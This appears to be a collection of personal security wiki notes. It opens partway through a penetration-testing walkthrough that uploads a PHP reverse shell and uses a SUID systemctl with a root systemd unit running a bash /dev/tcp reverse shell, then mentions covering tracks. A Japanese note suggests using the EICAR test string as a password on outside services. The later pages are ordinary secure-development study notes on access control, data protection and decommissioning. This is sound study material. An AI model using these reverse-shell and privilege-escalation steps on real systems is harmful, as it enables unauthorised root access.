| -U and -P         | Username and Password for Basic Auth      |
| -p <x>            | Proxy to use for requests                 |
| -c <http_cookies> | Specify a cookie for simulating your auth |

### Fuzz a Page

We can use Burp Suite's "Intruder" to fuzz a website.

What we want to achieve here is test which file extension is allowed by
the website.

First we need to create a list (or use one from the Enterprise edition).

We intercept the `POST` request used to upload file and send it to the
Intruder tool. Using the "Attack type" called "Sniper", we add our
Payload to the file extension of the request.

On the "Payloads" tab, we add our list. On the "Options" tab we can use
the "Grep - Match" feature to flag result items with responses matching
an expression (for example "Extension not allowed"). This is helpful to
quickly find which extension doesn't return an error.

Time to start the attack!

Exploitation
------------

### Upload a Reverse Shell

There are a lot of reverse (PHP) shell out there. A famous one is from
[pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
although [YAPS](https://github.com/Nickguitar/YAPS) has gathered some
reconnaissance as well.

Update your IP address and the port to use in the file and upload the
file to the website (change file extension if necessary).

Next, use netcat to connect to listen to incoming connections:

``` sh
nc -lvnp <port_num>
```

Privilege Escalation
--------------------

Also called *privesc*, is the action of gaining access to root on a
machine by one mean or another.

Using SUID file is a great way to gain privesc. To find SUID files,
type:

``` sh
find / -perm -u=s -type f 2>/dev/null
```

This show every SUID file type owned by root user on root file system
and below. `stderr` (standard error) is redirected to `/dev/null` to
prevent errors from polluting the results.

Let's say we found binary `systemctl` with SUID. `systemctl` is used to
start, stop and generally manage services. For this reason it's best to
let privilege users only be able to use it.

### Create the Payload

We can craft a `systemd` unit file which execute a payload as root user:

``` service
[Unit]
Description=Open a shell with root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<client_ip>/<port_1> 0>&1'

[Install]
WantedBy=multi-user.target
```

The `User` is important to let `systemd` we want to execute as *root*.
Here, `ExecStart` is a simple one-line bash reverse shell.

`<port>` is the port we will use to connect later.

### Upload the Payload

Next, we need to upload that payload to our server (or write it as a one
liner). Once again we can use netcat for this task. On the target
machine (i.e. through our reverse proxy):

``` sh
nc -vl <port_2> > /tmp/rootshell.service
```

Folder is `/tmp` as it should be writable even to non root user.

From our client machine, we send the file:

``` sh
nc -n <target_ip> <port_2> < rootshell.service
```

### Connect to the Host and Gain Privesc

This is getting confusing but we need another netcat session to listen
to the root shell:

``` sh
nc -lvnp <port_1>
```

On the target machine (through the first reverse proxy) execute the
payload using `systemctl`:

``` sh
systemctl enable /tmp/rootshell.service
systemctl start rootshell.service
```

:::{.highlight-block}
If you get an error like although you have an `[Install]` section:

``` txt
The unit files have no [Install] section. They are not meant to be enabled
using systemctl.
```

It's because old version of `systemctl` only loads services from a set
of pre-defined paths. Use `systemctl link /tmp/rootshell.service` first
to allow loading (in later version this is done automatically with
`enable` command).
:::

And voilà!

Post-Exploitation
-----------------

Depending on the system there may be post-exploitation stages. This
stage generally involves:

1.  Pivoting: what other hosts can be targeted
2.  What additional information can we gather from the host now that we
    are a privileged user
3.  Covering your tracks
4.  Reporting


===

<!-- Source: computing/security/plain-text-password-eicar.md -->
<!-- URL: /computing/security/plain-text-password-eicar -->
<!-- Title: パスワードが平文で保存されているかを確認する雑な方法 -->
<!-- Wikilinks: [[computing/security/plain-text-password-eicar]], [[security/plain-text-password-eicar]], [[plain-text-password-eicar]] -->

---
date: 2020-10-03T18:55
---

# パスワードが平文で保存されているかを確認する雑な方法

{.ui .warning .message}
下記に書いてある手順は大変な事件を起こしてしまう可能性がある。
リストを十分に理解した上でテストを行ってください。

何らかのウェブサイトやサービスがパスワードを平文で保存していると疑っている?

なら、パスワードを下記に変更してみると良いかも。

```txt
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```


## なんだそりゃ

上記の68文字は世界共通のアンチウィルステスト文字列。アンチウィラスソフトウェア
の動作を確認するために使われていて、ソフトウェアがこの文字列を検知したら
ウィラス検知と同様の動作をとるはず[^1]。

もしパスワードが平文で保存されている、かつ、アンチウィラスソフトがサーバに
動作していたら、この文字列を検知して動作する。その後何が起こるかは保証しない。


詳しくは [EICAR](https://www.eicar.org/?page_id=3950) のウェブサイトを参照。

[^1]: 場合によっては特別なメッセージを表示するが、動作しないと設定を疑うべき。


===

<!-- Source: computing/security/relationship-data-information-intelligence.md -->
<!-- URL: /computing/security/relationship-data-information-intelligence -->
<!-- Title: Relationship of Data, Information, and Intelligence -->
<!-- Wikilinks: [[computing/security/relationship-data-information-intelligence]], [[security/relationship-data-information-intelligence]], [[relationship-data-information-intelligence]] -->

---
date: 2021-06-08T10:13
---

# Relationship of Data, Information, and Intelligence

Raw data has relatively limited utility and value. Its processing and
exploitation, however, transform data in information which can be used.
Coupling information with other information and past experience can
sometimes show this same information in a new light, which helps developing
new understanding of the information. At this point, it can be called
_intelligence_.

The analyse and comparison of information against other information and/or
databases helps use draw conclusions. Intelligence has two features that
distinguish it from information:

- Intelligence allows anticipation or prediction of future situations and
  circumstances
- Intelligence informs decisions by illuminating the differences in
  available courses of action

The revised edition of JP 2-0, _Joint Intelligence_ has a great figure to
illustrate the relationship of data, information and intelligence.

![Relationship of Data, Information, and Intelligence](./static/joint_intelligence-relationship_data_info_intel.png)
<figcaption class="">Figure I-1. Relationship of Data, Information, and Intelligence <small><a href="https://www.jcs.mil/Portals/36/Documents/Doctrine/pubs/jp2_0.pdf">Source</a></small></figcaption>


===

<!-- Source: computing/security/scanning-networks.md -->
<!-- URL: /computing/security/scanning-networks -->
<!-- Title: Scanning Networks -->
<!-- Wikilinks: [[computing/security/scanning-networks]], [[security/scanning-networks]], [[scanning-networks]] -->

---
date: 2022-08-19
---

Scanning Networks
=================

Scanning networks is a part of reconnaissance that is used to create a
map of the target network. Ideally, scanning should be an iterative
process instead of as a one-off action, as the network of a target moves
constantly.

The goals and objectives of scanning is to:

-   Discover the network's live hosts, it's addresses, and ports
-   Discover the OS and system architecture of the target (also called
    [[what-is-reconnaissance-footprinting|fingerprinting]])
-   Discover the services running/listening on the target system
-   Identify specific applications or versions of a particular service
-   Identify vulnerabilities in any of the network systems

There are different types of scanning:

Network Scanning
----------------

A procedure for identifying active hosts on a network, either to attack
them or assess the security of the network

-   Identify active hosts
-   Identify operating systems (not only PC but also printer, switch,
    router etc.)
-   Identify IP addresses

Port Scanning
-------------

Commonly called *port scan*.

Port scan is the process of checking the services running on the target
computer by sending a sequence of messages in an attempt to break in.

It involves connecting to or robing TCP and UDP ports of the target
system to determine whether the services are running or are in a
listening state.

Scan some or all (65,535) ports potentially running on a machine to
check which one are open and which one are closed. We generally focus on
the first 1,023 (privileged ports).

Vulnerability Scanning
----------------------

A method for checking if a system is exploitable by identifying its
vulnerabilities.

A vulnerability scanner consists of a scanning engine and a catalog of
common files with known vulnerabilities and common exploits (or payload
) for those vulnerabilities.


===

<!-- Source: computing/security/secure-ssh-key-generation.md -->
<!-- URL: /computing/security/secure-ssh-key-generation -->
<!-- Title: Secure SSH Key Generation -->
<!-- Wikilinks: [[computing/security/secure-ssh-key-generation]], [[security/secure-ssh-key-generation]], [[secure-ssh-key-generation]] -->

---
date: 2020-09-04T13:30
tags:
  - tips
  - security
---

# Secure SSH Key Generation

I like to use Ed25519 for generating SSH keys. It is both
[secure and fast](https://security.stackexchange.com/questions/5096/rsa-vs-dsa-for-ssh-authentication-keys/46781#46781).

```sh
ssh-keygen -t ed25519 -o -a 100
```

Unfortunatly, it is yet not supported on older hardwares (legacy systems). In
that case, once can use RSA.

```sh
ssh-keygen -t rsa -b 4096 -o -a 100
```


Source:

* [Secure Secure Shell](https://stribika.github.io/2015/01/04/secure-secure-shell.html)


===

<!-- Source: computing/security/ssdlc/access-control-requirements.md -->
<!-- URL: /computing/security/ssdlc/access-control-requirements -->
<!-- Title: Access Control Requirements -->
<!-- Wikilinks: [[computing/security/ssdlc/access-control-requirements]], [[security/ssdlc/access-control-requirements]], [[ssdlc/access-control-requirements]], [[access-control-requirements]] -->

---
date: 2023-09-30T12:33:14+09:00
---

# Access Control Requirements

One of the most important concept in software is **access**. This is because
software is the gateway: it gives access to hardware, allows us to use networks,
resources, databases etc.

All of the objects cited above needs protection and therefore, an integral part
of security in software is **access control**.

Access control is the idea of management access between a *subject* and an
*object* (or resource).

1.  The *subject* requests access to the *object*
2.  The *request* is intercepted by the *access control mechanism* (often called
    *reference monitor*)
3.  The *reference monitor* checks if the *subject* is allowed access to the
    *object*, it asks the *access control list* (or *security kernel* or
    *database*) if access can be granted, and also the legitimate level
    (read-only, write, etc?)
4.  All access request, allowed or denied, must be logged in the *audit log*

The last step ensure we have a record of who was on the system, at what time,
and also what did they do.

This is all part of the concept of **Identity and Access Management (IAM)**.

## IAM

Managing access requirements requires working with the information and system
owners.

Access is often determined by legal requirements, time of day (temporal),
location, roles etc.

To know whether someone or a system can be granted access, we need
**identification** (or person or process).

## AAA (Triple A)

Triple A stands for:

-   Authentication
-   Authorization
-   Accounting (Accountability, Auditing)

The idea of the AAA represents the three levels of permission that is given.

### Authentication

Authentication is the validation of the ID provided: proving that ID is used by
the rightful owner of it.

There are three main ways to do authN:

1.  Knowledge: something you know (password etc)
2.  Ownership: something you have (physical key etc)
3.  Characteristic: something you are (biometrics)

None of the above is good on its own so we must support **MFA – Multi-Factor
Authentication**.

This is the combination of two or more *different* authentication methods.

Single Sign-On (SSO) can also be used as a centralized process to manage access
to multiple systems.

For modern software, this means that instead of building our own access control
system, we should integrate with an existing SSO solution. This ensures that our
software is managed consistently across different systems of the organization.

On the web, in order to achieve SSO, we need *Federated Identity Management*.

#### Node Authentication Methods

Node authentication is used when we would like to authenticate a device. There
are, for example, software that will only run on certain pre-registered CPU
numbers. Other node authentication methods include by IP address or by Media
Access Control (MAC) address. A physical key fob can also be used, where a piece
of software would only run if the keyfob was inserted into the system or device.

This can be used to prevent someone from using that same software on multiple
systems, for example.

#### Credential Management Systems

How we try to make sure that only authorized users can log in may be through the
issuance of a smart card or USB token.

This smart card will have a PKI (Public Key Infrastructure) certificate on them.

This is often used in conjunction with a OTP (One-Time Password) device or
biometrics.

The advantage of credential management system is that it may support diverse and
dispersed user population, remotely, and credentials may be re-issued when
necessary.

Session should also be closed when not in used (this is specially true with, for
example, bank website). On a computer, a timeout system can be set up to
auto-lock the computer. Invalid access attempts should also be limited.

This can also be driven by policies, such as clear screen/clean desk policies.

Authentication is an integral part of software development: we need to verify
that only the correct owner of an identifier is using it.

### Authorization

See [[authorization]]#

### Accountability

See [[accountability]]#


===

<!-- Source: computing/security/ssdlc/accountability.md -->
<!-- URL: /computing/security/ssdlc/accountability -->
<!-- Title: Accountability -->
<!-- Wikilinks: [[computing/security/ssdlc/accountability]], [[security/ssdlc/accountability]], [[ssdlc/accountability]], [[accountability]] -->

---
date: 2023-10-01T19:55:01+09:00
---

# Accountability

Sometimes called “auditing”, accountability deals with “what did the user do
when they were on the system?”, and we have the ability to associate all
activity on a system with the entities that were involved.

This requires unique identifiers (sharing the same user ID, or account, makes
auditing difficult).

This is often needed for compliance and legal reasons.

This establishes **accountability** for *transactions* (who access the sensitive
data, who made the changes?) and *administrative functions* (who started a job
or initiated a process?).

For accountability to work, we need to have sources we can trust, i.e. we have
to prove the source and integrity of transactions on a system.

This means logs may need to be duplicated and saved in a separated place and we
need to be able to check they were not altered or destroyed somehow.

We also want to check for *transmission errors*. For example we want to make
sure when a person does a transaction, it will not be processed twice, and the
person be charged two times. Same with interuption in communication, we want to
make sure we don’t have a half-done transaction.

One way to prove accountability, just like [[integrity]] is to use
*hashing*. We could also have *header and trailer records* for files passed
between systems, so we could identify if a files was missing, or if half the
file was transmitted.

This is the reason *end of report notices* exists: to prove completion of the
printing of a report (even on empty reports).

The next important concept is **non-repudiation**: to know who did what, and
they have no way to *repudiate* (deny) that they were the one doing the
activity.

Non-repudiation can be achieve with strong logging system: who, when, what and
comments on why a certain action was taken.

Logs need to be retained for a certain length of time. This is sometimes for
legal requirements but also it serves internal investigations. Depending on the
use case, it can be month or years, or in other cases days.

During that time, logs should be protected against alteration, access, and
deletion.

The log should be taken at the **point of activity** (error, during
modification, access etc), analysed, and aggregated centrally if possible to get
a better overview of everything happening.


===

<!-- Source: computing/security/ssdlc/authorization.md -->
<!-- URL: /computing/security/ssdlc/authorization -->
<!-- Title: Authorization -->
<!-- Wikilinks: [[computing/security/ssdlc/authorization]], [[security/ssdlc/authorization]], [[ssdlc/authorization]], [[authorization]] -->

---
date: 2023-10-01T19:47:11+09:00
---

# Authorization

Authorization ensures that we give the **correct** privilege levels provided to
subject.

This is done through **access controls**: they permit authorized entities
(persons, processes etc) to perform authorized functions.

Access rights (the permissions), can have different level of granularity such
as:

-   Create
-   Read
-   Update
-   Delete
-   Full control (administrator)

Another layer of access control is **entitlements**: more granular of access
controls, often based on group membership. It enforces access rules.

Access controls are **at the heart of information security**: all of security
comes down to *who* is on our system and *what* can they do on it. And of
course, have a record of all the activities taking place.


===

<!-- Source: computing/security/ssdlc/availability.md -->
<!-- URL: /computing/security/ssdlc/availability -->
<!-- Title: Availability -->
<!-- Wikilinks: [[computing/security/ssdlc/availability]], [[security/ssdlc/availability]], [[ssdlc/availability]], [[availability]] -->

---
date: 2023-09-30T12:13:34+09:00
---

# Availability

Availability is about making sure that our systems and our data are there when
required. This covers not only the systems and information but also the
networks, personnel, and software.

This is not often thought as a security concept, but it is.

Availability is dependent on the criticality of the resource: if the information
was not available when required, could that lead to serious harm or would it be
an inconvenience?

Once the criticality of the resource is defined, we can build in **fault
tolerance** (ability to detect and take action if there was a failure). This is
often done through **redundancy** (of equipment or networks).

Most often this is achieved through a **failover**: moving from one system to
another, and we often see this when we have a **cluster** of server.
**Replication** is another solution.

We also need to prepare for disaster and have **backups** to recover the data
when needed.

## Availability within Applications

We build the application to be resilient: it needs to withstand attacks it will
face.

We need to make sure the system can handle error without some type of crash
(error handling).

Also, the application should take in variation in resource needed during busy
time, even when unexpected: this is call **scalability**. This can be caused by
the number of users or the volume of transaction.

Business needs to determine the required levels of availability.


===

<!-- Source: computing/security/ssdlc/complete-mediation.md -->
<!-- URL: /computing/security/ssdlc/complete-mediation -->
<!-- Title: Complete Mediation -->
<!-- Wikilinks: [[computing/security/ssdlc/complete-mediation]], [[security/ssdlc/complete-mediation]], [[ssdlc/complete-mediation]], [[complete-mediation]] -->

---
date: 2023-10-02T08:01:13+09:00
---

# Complete Mediation

Complete mediation means that **all access requests from a *subject* to an
*object* (such as from a user to a program) should be checked to make sure those
are valid.**

This includes things like process threads and subprocesses, and differentiate
between different levels of users.

**Session management** is a challenging concept to get right (as shown by it
being on the Top Ten Critical Web Application Vulnerabilities since 2007):
application functions related to authentication and session management are often
implemented incorrectly, allowing attackers to compromise passwords, keys, or
session tokens, or to exploit other implementation flaws to assume other users’
identities temporarily or permanently.


===

<!-- Source: computing/security/ssdlc/confidentiality.md -->
<!-- URL: /computing/security/ssdlc/confidentiality -->
<!-- Title: Confidentiality -->
<!-- Wikilinks: [[computing/security/ssdlc/confidentiality]], [[security/ssdlc/confidentiality]], [[ssdlc/confidentiality]], [[confidentiality]] -->

---
date: 2023-09-30T11:47:41+09:00
---

# Confidentiality

Security is based on a combination of three main principles forming the **CIA
triad**:

1.  Confidentiality
2.  Integrity
3.  Availability

They are a way to describe a vague term like “security” to non-security person,
like management etc.

We uses this term to put a meaning and context around security.

Confidentiality is the way to make sure we **protect sensitive data from
improper disclosure**, i.e. making sure that anything which is private or secret
is not given to unauthorized people.

This include:

-   Privacy
-   Secrecy

## Overt vs. Covert

The way to preserve confidentiality is to look at how that confidentiality can
be breached. This is often done through was is called either **overt** (obvious)
or **covert** (hidden) channels.

To find the release of information in an unauthorized way, we can look at the
**timing** and the **storage**.

The covert timing channel is one that release information through monitoring of
system resources: a peak of CPU usage could indicate that something has started
on the system. We can’t see which information but it indicates an event.

The other is covert storage, where data was stored in an insecure manner.

## Preservation of Confidentiality

There are different ways to preserve the confidentiality of the data:

-   Masking: data are masked (like when a password is typed)
-   Obfuscation: scramble the data
-   Tokenization: we replace sensitive data with a token value (often done with
    credit card numbers)
-   Encryption: data cannot be read or seen by someone without the correct
    decryption key

The application should be designed and built to support protection of
confidentiality.

A disclosure of information can be intentional but most often accidental.


===

<!-- Source: computing/security/ssdlc/core-security-principles.md -->
<!-- URL: /computing/security/ssdlc/core-security-principles -->
<!-- Title: Core Security Principles -->
<!-- Wikilinks: [[computing/security/ssdlc/core-security-principles]], [[security/ssdlc/core-security-principles]], [[ssdlc/core-security-principles]], [[core-security-principles]] -->

---
date: 2023-09-29T18:01:52+09:00
---

# Core Security Principles

The following core security principles are necessary to develop and operate
secure software:

1.  [[governance]]#
2.  [[confidentiality]]#
3.  [[integrity]]#
4.  [[availability]]#
5.  [[access-control-requirements]]#
6.  [[authorization]]#
7.  [[accountability]]#


===

<!-- Source: computing/security/ssdlc/data-destruction.md -->
<!-- URL: /computing/security/ssdlc/data-destruction -->
<!-- Title: Data Destruction -->
<!-- Wikilinks: [[computing/security/ssdlc/data-destruction]], [[security/ssdlc/data-destruction]], [[ssdlc/data-destruction]], [[data-destruction]] -->

---
date: 2023-10-06T10:03:17+09:00
---

# Data Destruction

When removing software, we need to be very careful not to cause a breach of data
privacy or integrity.

## Data Retention Policies

Data retention can be based on **legal requirements** or **business needs**.
Other case can be because of **fear of liability** or **cost of retention**.

## Retention

Data retention is the **ability to recover old data**, for example for
regulatory inquiries.

This means we need to think about the **lifespan of media**: is that a media
type we will still be able to use in 20, 40 years? The media were the data is
stored also have *deterioration point*.

## End of Live Data

End of life data can be archived to prevent cluttering of database.

The question is “is the data **encrypted**?” and if yes, we must keep the
encryption tools and the algorithms available as well for recovery.

Note: this also applies to backups.

When we *want* data to be deleted, we need to be very careful about
**recovery**. This is specially true when dealing with privacy.

## Procedures

Once again, we need procedures:

Data disposal can be done in several ways:

-   Deletion
-   Overwrite
-   Purge
-   Degaussing (magnetic force to reduce the magnetic flux density back to 0
    making it difficult to recover the data)
-   Crypto shredding/erasure (delete the encryption key to prevent recovering of
    encrypted data)
-   Destruction (physically chew it up and/or melt it down)

## Residual Data

Data remanence is something to fear: data that were not correctly deleted and
are still recoverable somehow.

For some types of media such as HDD, SSD, tapes and optical disks, physical
destruction is the most secure way to make sure there is no residual data left
for someone to snoop in.

## Archival

There are things we **want** to keep: for example for historical significance
(memorabilia).

When doing so, we need to be careful of:

-   Age of media: will the media be unusable at some point?\_
-   Ability to read all media: will we still be able to read the media?
-   Encryption keys: to be able to decrypt the data

**Key points review:** Ensure data is retained or disposed of according to
policy. Secure (defensible) data deletion: we have assurance the data was
deleted.


===

<!-- Source: computing/security/ssdlc/data-lifecycle.md -->
<!-- URL: /computing/security/ssdlc/data-lifecycle -->
<!-- Title: Data Lifecycle -->
<!-- Wikilinks: [[computing/security/ssdlc/data-lifecycle]], [[security/ssdlc/data-lifecycle]], [[ssdlc/data-lifecycle]], [[data-lifecycle]] -->

---
date: 2023-10-16T17:09:01+09:00
---

# Data Lifecycle

Data must be protected at all stage of its lifecycle, from its **generation**
until its **disposal**.

This includes:

-   Generation: data creation (from another system or customer)
-   Processing
-   Storage
-   Retention: keep the data for a certain length of time
-   Disposition: orderly, planned process of handling data that may still have
    use
-   Disposal: destruction, removal, or transfer to another organization (archive
    etc)

Protection requirements for the data **may change** over its lifecycle: not
everything needs to be protected at all time.

## Data Collection Legal Issues

Country dependent. There may be legal requirements such as:

-   User consent
    -   Collection
    -   Marketing
-   Allowed uses of data (only collecting data that we need)
    -   Sharing
    -   Third-parties (terms)
-   Data accuracy: responsibility to keep data accurate and up to date as much
    as possible
-   Data retention: how long we keep the data, and why, and how to keep it safe
    -   Right to be forgotten

## Data Misuse and Abuse Risks

What are the ways that data could be misused?

-   Improper use by an employee
-   Hacker stealing it

A list of threats and risks must be created.

Other issues:

-   Data aggregation: data that were not sensible or personal in isolation
    becomes, in aggregation, sensible
-   Data inference: learning from watching some piece of data (marketing learns
    about people’s behaviors through when/how/what people buy, for example)
-   Unauthorized access
    -   Ransomware
-   Improper changes: data can’t be trusted anymore because we are being
    provided wrong information (could be a liability in a financial report, for
    example)

## Data Anonymization/De-Anonymization

-   (Pseudo-)Randomization: substitutes value for another so that it’s not
    easily identifiable (obfuscation)
-   Tokenization: identification numbers associated with a user that few people
    know the association of
-   Masking: data masked during input (password) or output (credit card numbers
    partially masked)
-   Encryption: for safe storage and transmission of data


===

<!-- Source: computing/security/ssdlc/data-protection.md -->
<!-- URL: /computing/security/ssdlc/data-protection -->
<!-- Title: Data Protection -->
<!-- Wikilinks: [[computing/security/ssdlc/data-protection]], [[security/ssdlc/data-protection]], [[ssdlc/data-protection]], [[data-protection]] -->

---
date: 2023-10-16T16:41:24+09:00
---

# Data Protection

The software provide access to the data so we to make sure it does so securely.

We cannot protect what we don’t know: we need a **data inventory**.

This can be achieve with the following information:

-   Data dictionary
    -   Data format must be set correctly
-   Data collection (where it is collected)
-   Data uses (where it is used, and how)
-   Data storage (where it is stored)

Types of data:

-   Structured data (data in database)
-   Unstructured data (emails’ body)

**Data classification** is done base on *impact* and is often classified as
either:

-   Sensitive data (can harm a person/organization if that data was improperly
    disclosed or modified, i.e. *confidentiality* and *integrity*)
-   Critical data (can harm a person/organization if that data was not available
    when needed, i.e. availability)
    -   Often, the *level of availability* is used here

Data classification requirements can be:

-   Legal: repercussion if we don’t have the data
-   Business: what kind of data the business really need?

The first step to protect data is to understand who has access to the data: this
is called **data ownership**. Who is the individual responsible for the
protection of the data?

-   Data owner:
    -   Legally recognized position: it has to be declared in many countries
        (could face punitive charges if due care not executed)
        -   Accountable
        -   Liable
    -   Sets policy: often, data owner is a senior manager and does not use the
        data themselves but set policies for how the data should be classified
        -   Approves procedures

## Data Classification Roles

-   Data Subject: customer who shares their name, address etc (data about them)
-   Data Custodian: looks after the data but is not the owner, like database or
    backup engineers (they are responsible for the protection of the data)
-   Data Processor: person who actually uses the data
-   Data Controller: person who has control of the data (in charge of making
    sure data is properly accessed and used in accordance with the policies and
    rules)
-   Data Protection Officer: often supports data owner. It’s a legally
    recognized role in many places.

### Role of the DPO

Under Article 37 of GDPR:

> DPOs are responsible for educating the company and its employees about
> compliance, training staff involved in data processing, and conducting regular
> security audits.

DPOs also serve as the point of contact between the company and any Supervisory
Authorities (SAs) that oversee activities related to data.

**Key Points Review:** You cannot protect an asset that you do not know about.
Applications manage access to, and changes, to data therefore the software
designer must be aware of the types of data the application will manage.

-   [[data-lifecycle]]#
-   [[implementing-data-protection]]#
-   [[data-sharing]]#


===

<!-- Source: computing/security/ssdlc/data-sharing.md -->
<!-- URL: /computing/security/ssdlc/data-sharing -->
<!-- Title: Data Sharing -->
<!-- Wikilinks: [[computing/security/ssdlc/data-sharing]], [[security/ssdlc/data-sharing]], [[ssdlc/data-sharing]], [[data-sharing]] -->

---
date: 2023-10-25T10:51:12+0900
---

# Data Sharing

We need to protect data that we do not have in our possession: data that we
share with other organizations.

**Even if an organization outsources the processing and storage of its data, the
accountability for the protection of the data remains *primarily* with the data
owner, not the processor.**

## Cloud and Third Party

Considerations to have:

-   Deletion of data in the cloud (original cloud but also their backups)
-   Bit splitting: split data in multiple cloud location so that only half (or
    more pieces) of the data is available in one location and can’t be read
    without the other half. It’s also possible to have a *N of M* system: 16 M
    locations and requires 9 to be able to recover the data
-   Crypto-erasure: erase the data by encrypting it and deleting the key
-   Ownership

The last point brings the topic of…

## Jurisdiction

-   Ownership of IP for outsourced functions: even if I outsource a function,
    making sure I don’t lose direct control over what should be my property
-   Dispute resolution agreements: how will dispute be resolved, where etc
-   Non-Disclosure Agreements (NDA): with the company and its employees

Most laws and regulation only protect the data of their citizens. They are
general laws: apply to all industries within that country. Some industry have
industry-specific laws (finance and health, for example).

Most of these laws say you must make a **declaration of a person accountable**
(not the organization).

### Treaties

Some countries have treaties. For example a lot of countries have treaties to be
GDPR-compliant.

We need to prove compliance and validate it through a BCP (Binding Corporate
Rules) and SCC (Standard Contractual Clauses) which set out the agreements
between the companies.

## Test Data and IP

Even for software testing, we need to have controls over the transmission of
test data and intellectual property.

**Key Points Review:** Data must be protected throughout the data lifecycle:

-   In all forms
-   At all times
-   In all places


===

<!-- Source: computing/security/ssdlc/decommissioning-software-securely.md -->
<!-- URL: /computing/security/ssdlc/decommissioning-software-securely -->
<!-- Title: Decommissioning Software Securely -->
<!-- Wikilinks: [[computing/security/ssdlc/decommissioning-software-securely]], [[security/ssdlc/decommissioning-software-securely]], [[ssdlc/decommissioning-software-securely]], [[decommissioning-software-securely]] -->

---
date: 2023-10-06T09:44:48+09:00
---

# Decommissioning Software Securely

We put a lot of effort to make sure our software is secure all through its life,
but there is also a lot of care that must be taken during decommissioning of a
software.

We want to make sure we are not going to end up with a breach of confidentiality
or privacy, or an interruption to business processes as we decommission our
software.

## End of Life (EOL)

Software reaches EOL for a variety of reasons:

-   Newer, better programs available
-   Too difficult/expensive to maintain
-   Lack of needed functionality (new regulations etc)
-   Hardware incompatibility

## EOL Practices

Like everything else, it starts with **policies**.

First, we want to remove the software from our asset management/configuration
management database (CMDB), and then we delete securely.

Policies are nothing but words: we need to back up policies with **procedures**.

Procedures explain how to do things properly and securely in a consistent,
standardized manner:

-   Notify all stakeholders
-   Migrate to new system (if necessary)
-   Backup applications, source code, object code, compilers, utilities,
    documentation, licenses, encryption keys etc in order to be able to get back
    in if necessary

Decommission often starts with a discussion with people with who we have a
**service level agreement (SLA)**. We should have a SLA termination clause with
them.

We remove our software from the job schedules so that unnecessary resources are
not used, and unexpected errors do not arise. Finally we remove access
permissions from the people that were previously using the software.

The documentation and operation manuals should be updated to reflect the
decommission and update the CMDB.

## Linkages

Linkages are dependencies and linked systems.

We want to make sure unnecessary connections are removed, and see if other
system are dependents with the decommissioned system. That downstream system
could be looking for a now missing input files and failing because of that. Same
with the monitoring systems.

**Key points review:** ensure software is decommissioned in a secure manner.
Ensure all stakeholders are informed. Watch out for undetected dependencies.

See also [[data-destruction]]#.


===

<!-- Source: computing/security/ssdlc/defense-in-depth.md -->
<!-- URL: /computing/security/ssdlc/defense-in-depth -->
<!-- Title: Defense in Depth -->
<!-- Wikilinks: [[computing/security/ssdlc/defense-in-depth]], [[security/ssdlc/defense-in-depth]], [[ssdlc/defense-in-depth]], [[defense-in-depth]] -->

---
date: 2023-10-02T08:43:21+09:00
---

# Defense in Depth

Defense in depth (also called layered defense) is one of the major concept of
security. It is used to avoid single point of failure or compromise.

Layered defense is putting a series of challenges a user has to overcome before
they got to something of value. That can take the form of input validation, a
process check, output validation and of course access permissions.

But the checks must be layered, i.e. there shouldn’t be only one check to
protect the key to the kingdom.

Layers of defense can be put on hardware, network, database, and virtual
machines.

A principle behind defense in depth is the segmentation and separation of
concerns, or **security zones**.

Security zones can be physical (constrained environment or user interface) or
logical (pre-selected items on a menu, separation of environments, virtual
machines etc).

**Diversity of defense** is another way to provide defense in depth: through
geographic diversity (redundancy in a separate country), distributed computing,
supply chain diversity (not relying on only one vendor).

**Technical diversity** is good when using multiple vendor but it can creates
compatibility and support issues.

**Key points:** Defense in depth ensures that layers of protection are used to
protect key assets. Controls are in serial, not in parallel, and acts as hurdles
that an attacker must overcome.


===

<!-- Source: computing/security/ssdlc/describe-psychological-acceptability.md -->
<!-- URL: /computing/security/ssdlc/describe-psychological-acceptability -->
<!-- Title: Describe Psychological Acceptability -->
<!-- Wikilinks: [[computing/security/ssdlc/describe-psychological-acceptability]], [[security/ssdlc/describe-psychological-acceptability]], [[ssdlc/describe-psychological-acceptability]], [[describe-psychological-acceptability]] -->

---
date: 2023-10-02T08:10:33+09:00
---

# Describe Psychological Acceptability

Many people and users think that security gets in their way of doing their work
or task. Therefore, security should be conscious of the impact of security on
those people. This is called **psychological acceptability**.

With a user, we want to be sure the user will not resist or work against the
actual security mechanisms we put in place. We want security to be **easy to
use** and make user understand that there is a **tangible benefit they can
see**.

A biometric authentication, for example, can have several user concerns such as
protection of privacy (intrusive), cleanliness (how many people used that
reader?) and authentication time (how long it takes to be authenticated).

CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans
Apart) is another technology with concerns (with usability, annoyance etc).

**Key point:** systems need to be build from a user perspective, and yet secure.


===

<!-- Source: computing/security/ssdlc/discovering-secure-software-requirements.md -->
<!-- URL: /computing/security/ssdlc/discovering-secure-software-requirements -->
<!-- Title: Discovering Secure Software Requirements -->
<!-- Wikilinks: [[computing/security/ssdlc/discovering-secure-software-requirements]], [[security/ssdlc/discovering-secure-software-requirements]], [[ssdlc/discovering-secure-software-requirements]], [[discovering-secure-software-requirements]] -->

---
date: '2023-10-09T13:48:45+0900'
---

# Discovering Secure Software Requirements

"Defining" could replace "discovering", but the later was chosen on
purpose to show that one cannot define something they do not know, and
therefore they need to discover those requirements.

The main requirement of software is to **support business operations**.
Therefore, understanding **business requirements** is primordial.

We also need to know about **legal requirements**: our industry may be
subject to requirements surrounding SLA (availability), encryption, etc.

**Ethical requirements**: understand our place as a business within
society and how to manage our software in a way that is fair, equitable
and in the best interest of society.

**Cost of downtime**: financial (if we have an SLA) and reputational
risks.

## Project Failure

Two questions to ask:

**Why do so many software project fail?** and **how would you define
failure?**

Examples of failures:

-   Late delivery
-   Overbudget
-   Fails to meet user expectations (different from what the user *asked
    for*: user may not be able to articulate correctly what they need)

## Causes of Project Failure

-   Wrong, incomplete or changing requirements
-   New unproven technology
-   Unrealistic expectations
-   Lack of experienced staff (specially for legacy programs)

Now that we know what can cause failure, let's review what are the
conditions for project success

## Project Success

-   Understanding Security:
    -   Build security into the project
    -   Start early (shift left)
    -   Gather security and functional requirements

Let's review how a software is often developed in a company.

In traditional software development, the **system/business owner** ask
for a new system; they ask IT for help. The business owner know how to
**describe functional requirements**: how will this system support their
business?

A good system is developed according the software development lifecycle:
